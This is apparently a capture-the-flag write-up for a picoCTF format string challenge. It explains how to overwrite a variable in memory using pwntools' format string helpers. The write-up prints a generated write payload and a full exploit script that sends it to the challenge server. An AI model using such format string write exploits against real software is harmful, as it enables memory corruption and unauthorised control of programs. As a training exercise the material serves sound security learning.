# format string 2
Unlike the previous format string challenge, we now want to write data using the same exploit.

In this case we need to change the value of variable `sus` from `0x21737573` to `0x67616c66`.

The hint is that pwntools can help with this. Looking at the documentaiton the problem is exactly the same.

We first have to find the address of `sus` which we can do using `objdump -d vuln | grep "sus"`. This gives us that `sus` is located in `0x404060`. 

Then we follow the documentation of pwntools. We automatically find the offset (14) where it is on the stack and then pwntools creates the payload: 
```
%102c%20$llnc%21$hhn%5c%22$hhn%245c%23$hhnaaaaba`@@\x00\x00\x00\x00\x00c@@\x00\x00\x00\x00\x00a@@\x00\x00\x00\x00\x00b@@\x00\x00\x00\x00\x00
```

and that changes the values, giving us the flag.

Solution code:

```
from pwn import *

host = "rhea.picoctf.net"
port = 51733


context.binary = ELF("./vuln")

p = remote(host, port)

def exec_fmt(payload):
    p = remote(host, port)
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

print(offset)

# old addr, new addr
# found old addr by objdump -d vuln | grep "sus"
payload = fmtstr_payload(offset, {0x404060: 0x67616c66})

print(payload)

p.sendline(payload)

flag = p.recvall()

print("flag:", flag)
```